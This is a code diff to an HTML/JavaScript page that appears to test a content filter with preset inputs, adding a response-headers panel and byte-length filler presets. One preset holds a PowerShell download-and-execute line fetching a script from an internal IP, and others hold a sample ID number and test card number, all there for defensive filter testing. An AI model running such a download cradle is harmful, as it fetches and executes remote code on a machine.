@@ -22,6 +22,11 @@
   #status.blocked { background: #fdecea; color: #b3261e; border: 1px solid #f3b4ae; }
   #status.other { background: #fff4e5; color: #8a5300; border: 1px solid #f0d4a3; }
   #jsonBox { margin-top: 8px; padding: 12px; background: #f4f4f4; border: 1px solid #ddd; white-space: pre-wrap; word-break: break-all; font-family: monospace; font-size: 13px; }
+  #headersBox { margin-top: 8px; padding: 12px; background: #fbfbfb; border: 1px solid #e5e5e5; font-family: monospace; font-size: 12px; display: none; }
+  #headersBox summary { cursor: pointer; font-weight: bold; color: #444; }
+  #headersBox table { width: 100%; margin-top: 8px; border-collapse: collapse; }
+  #headersBox td { padding: 2px 6px; vertical-align: top; word-break: break-all; }
+  #headersBox td.key { color: #555; white-space: nowrap; width: 1%; }
   #htmlFrame { margin-top: 8px; width: 100%; min-width: 610px; height: 500px; border: 1px solid #ddd; }
   .note { color: #777; font-size: 12px; margin-top: 8px; }
   table.history { width: 100%; border-collapse: collapse; margin-top: 12px; font-size: 12px; }
@@ -46,12 +51,11 @@
   <div id="byteCounter">0 bytes</div>
 
   <div>
-    <button type="button" class="preset" data-fill="身分證字號A123456789姓名王小明">身分證字號＋姓名（會擋）</button>
-    <button type="button" class="preset" data-fill="cardtest">關鍵字 cardtest</button>
+    <button type="button" class="preset" data-fill="身分證字號A123456789姓名王小明">身分證字號＋姓名</button>
     <button type="button" class="preset" data-fill="IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')">可疑PowerShell片段</button>
     <button type="button" class="preset" data-fill="信用卡卡號 4111 1111 1111 1111 有效期限 12/28">信用卡卡號</button>
-    <button type="button" class="preset" data-fill="cardtest29">29 bytes（剛好低於30門檻）</button>
-    <button type="button" class="preset" data-fill="cardtest2029">31 bytes（剛好高於30門檻）</button>
+    <button type="button" class="preset" data-len="29">通用內容 29 bytes（剛好低於30門檻）</button>
+    <button type="button" class="preset" data-len="31">通用內容 31 bytes（剛好高於30門檻）</button>
     <button type="button" class="preset" data-fill="">清空</button>
   </div>
 
@@ -64,6 +68,10 @@
 
 <div id="result">
   <div id="status"></div>
+  <details id="headersBox">
+    <summary>完整回應標頭（Response Headers）</summary>
+    <table id="headersTable"></table>
+  </details>
   <div id="jsonBox" style="display:none;"></div>
   <iframe id="htmlFrame" style="display:none;"></iframe>
 </div>
@@ -105,9 +113,19 @@ function updateByteCounter() {
 textEl.addEventListener('input', updateByteCounter);
 updateByteCounter();
 
+function makeFillerOfLength(n) {
+  const prefix = 'test-';
+  if (n <= prefix.length) return 'x'.repeat(n);
+  return prefix + 'x'.repeat(n - prefix.length);
+}
+
 document.querySelectorAll('button.preset').forEach(btn => {
   btn.addEventListener('click', () => {
-    textEl.value = btn.dataset.fill || '';
+    if (btn.dataset.len) {
+      textEl.value = makeFillerOfLength(parseInt(btn.dataset.len, 10));
+    } else {
+      textEl.value = btn.dataset.fill || '';
+    }
     updateByteCounter();
   });
 });
@@ -118,6 +136,22 @@ function addHistoryRow(size, tagClass, tagText, preview) {
   tr.innerHTML = `<td>${time}</td><td>${size}</td><td><span class="tag ${tagClass}">${tagText}</span></td><td class="preview"></td>`;
   tr.querySelector('.preview').textContent = preview.slice(0, 120);
   historyBody.prepend(tr);
+}
+
+function renderHeaders(res) {
+  const table = document.getElementById('headersTable');
+  const box = document.getElementById('headersBox');
+  table.innerHTML = '';
+  const rows = [[`(status line)`, `HTTP ${res.status} ${res.statusText}`]];
+  res.headers.forEach((value, key) => rows.push([key, value]));
+  rows.forEach(([k, v]) => {
+    const tr = document.createElement('tr');
+    tr.innerHTML = `<td class="key"></td><td></td>`;
+    tr.children[0].textContent = k;
+    tr.children[1].textContent = v;
+    table.appendChild(tr);
+  });
+  box.style.display = 'block';
 }
 
 async function sendOnce(fd, textPreview, sizeOverride) {
@@ -163,6 +197,7 @@ document.getElementById('f').addEventListener('submit', async function (e) {
   resultEl.style.display = 'block';
   jsonBox.style.display = 'none';
   htmlFrame.style.display = 'none';
+  document.getElementById('headersBox').style.display = 'none';
   statusEl.className = '';
   statusEl.textContent = '送出中...';
 
@@ -170,6 +205,7 @@ document.getElementById('f').addEventListener('submit', async function (e) {
     const r = await sendOnce(fd, textEl.value);
     statusEl.className = r.tagClass === 'ok' ? 'ok' : (r.tagClass === 'blocked' ? 'blocked' : 'other');
     statusEl.textContent = r.statusMsg;
+    renderHeaders(r.res);
     if (r.showJson) {
       jsonBox.style.display = 'block';
       jsonBox.textContent = JSON.stringify(r.parsed ?? r.raw, null, 2);
